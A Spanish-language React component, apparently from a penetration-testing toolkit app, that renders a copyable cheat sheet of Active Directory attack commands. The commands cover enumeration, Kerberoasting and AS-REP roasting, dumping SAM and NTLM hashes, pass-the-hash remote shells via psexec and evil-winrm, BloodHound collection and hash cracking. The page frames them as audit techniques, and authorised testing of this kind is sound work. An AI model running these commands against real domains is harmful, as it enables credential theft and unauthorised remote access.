import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp, Info } from 'lucide-react'

const COLOR = '#f59e0b'

const PHASES = [
  {
    cat: '🔍 Reconocimiento — Enumeración AD',
    items: [
      { cmd:'enum4linux -a 192.168.1.122', desc:'Enumeración completa: usuarios, grupos, shares, políticas de contraseñas' },
      { cmd:'enum4linux-ng -A 192.168.1.122 -oA resultado', desc:'Versión mejorada con output en JSON/YAML' },
      { cmd:'netexec smb 192.168.1.122 -u "" -p "" --users', desc:'Enumerar usuarios via SMB null session' },
      { cmd:'netexec smb 192.168.1.122 -u "" -p "" --groups', desc:'Enumerar grupos del dominio' },
      { cmd:'netexec smb 192.168.1.122 -u "" -p "" --pass-pol', desc:'Ver política de contraseñas (intentos, longitud mínima)' },
      { cmd:'ldapsearch -x -H ldap://192.168.1.122 -b "DC=dominio,DC=local"', desc:'Enumerar AD via LDAP sin credenciales' },
    ]
  },
  {
    cat: '🔑 Obtención de credenciales',
    items: [
      { cmd:'kerbrute userenum /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -d dominio.local --dc 192.168.1.122', desc:'Enumerar usuarios válidos via Kerberos (sin lockout)' },
      { cmd:'impacket-GetNPUsers dominio.local/ -usersfile usuarios.txt -no-pass -dc-ip 192.168.1.122', desc:'AS-REP Roasting — usuarios sin preautenticación Kerberos' },
      { cmd:'impacket-GetUserSPNs dominio.local/usuario:contraseña -dc-ip 192.168.1.122 -request', desc:'Kerberoasting — obtener TGS tickets de service accounts' },
      { cmd:'netexec smb 192.168.1.122 -u admin -p contraseña --sam', desc:'Dump SAM database si tienes credenciales de administrador local' },
      { cmd:'impacket-secretsdump dominio.local/admin:pass@192.168.1.122', desc:'Dump de todos los hashes (NTLM) si tienes admin' },
    ]
  },
  {
    cat: '🔓 Pass-the-Hash / Overpass-the-Hash',
    items: [
      { cmd:'netexec smb 192.168.1.122 -u admin -H "NTLM_HASH_AQUI"', desc:'Pass-the-Hash — autenticarse con hash en lugar de contraseña' },
      { cmd:'impacket-psexec dominio.local/admin@192.168.1.122 -hashes :NTLM_HASH', desc:'Shell remota con PsExec usando hash NTLM' },
      { cmd:'evil-winrm -i 192.168.1.122 -u admin -H "NTLM_HASH"', desc:'WinRM shell con Pass-the-Hash' },
    ]
  },
  {
    cat: '🗺️ BloodHound — Mapeo de rutas de escalada',
    items: [
      { cmd:'sudo neo4j start', desc:'Iniciar Neo4j (base de datos de BloodHound)' },
      { cmd:'bloodhound-python -u usuario -p contraseña -d dominio.local -ns 192.168.1.122 -c All', desc:'Recolectar todos los datos del AD para BloodHound' },
      { cmd:'bloodhound &', desc:'Abrir interfaz gráfica BloodHound (importar archivos JSON recolectados)' },
      { cmd:'SharpHound.exe -c All', desc:'Recolector BloodHound para Windows (ejecutar en el dominio)' },
    ]
  },
  {
    cat: '🔐 Cracking de hashes AD',
    items: [
      { cmd:'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt', desc:'-m 1000 = NTLM (Windows) — muy rápido con GPU' },
      { cmd:'hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt', desc:'-m 13100 = Kerberos TGS-REP (Kerberoasting)' },
      { cmd:'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt', desc:'-m 18200 = Kerberos AS-REP (AS-REP Roasting)' },
      { cmd:'john --format=NT ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt', desc:'John the Ripper para NTLM' },
    ]
  },
  {
    cat: '📋 Herramientas necesarias',
    items: [
      { cmd:'sudo apt install impacket-scripts bloodhound neo4j kerbrute enum4linux-ng netexec evil-winrm', desc:'Instalar suite completa de herramientas AD en Kali' },
      { cmd:'pip3 install bloodhound', desc:'Instalar BloodHound Python ingestor' },
      { cmd:'sudo apt install neo4j && sudo neo4j-admin set-initial-password neo4jpassword', desc:'Configurar Neo4j para BloodHound (password inicial)' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(245,158,11,0.12)', color: copied ? '#10b981' : '#f59e0b' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolAD() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="🏢" name="Active Directory" color={COLOR} badge="Reconocimiento · Kerberoasting · BloodHound · Pass-the-Hash">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(245,158,11,0.08)', border:'1px solid rgba(245,158,11,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <Shield size={13} style={{ color:'#f59e0b', flexShrink:0, marginTop:1 }}/>
          <span>Técnicas de auditoría de Active Directory. Las auditorías internas de AD son uno de los vectores más críticos en entornos corporativos.</span>
        </div>

        {/* Fases del ataque AD */}
        <div style={{ background:'rgba(245,158,11,0.05)', border:'1px solid rgba(245,158,11,0.15)', borderRadius:12, padding:'16px 20px', marginBottom:24 }}>
          <div style={{ color:'#fbbf24', fontWeight:700, fontSize:12, marginBottom:12 }}>🗺️ Metodología de auditoría AD</div>
          <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(200px, 1fr))', gap:10 }}>
            {[
              { fase:'1. Reconocimiento', tools:'enum4linux, nmap, ldapsearch', color:'#06b6d4' },
              { fase:'2. Enumeración usuarios', tools:'kerbrute, netexec, BloodHound', color:'#a855f7' },
              { fase:'3. Explotación', tools:'Kerberoasting, AS-REP, PtH', color:'#e63946' },
              { fase:'4. Movimiento lateral', tools:'evil-winrm, psexec, wmiexec', color:'#f59e0b' },
              { fase:'5. Persistencia', tools:'Golden/Silver Ticket, DCSync', color:'#10b981' },
            ].map((f,i) => (
              <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                <div style={{ color:f.color, fontSize:12, fontWeight:700, marginBottom:4 }}>{f.fase}</div>
                <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{f.tools}</div>
              </div>
            ))}
          </div>
        </div>

        {PHASES.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom:6 }}>
                      <code style={{ flex:1, fontSize:11, color:'#fbbf24', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
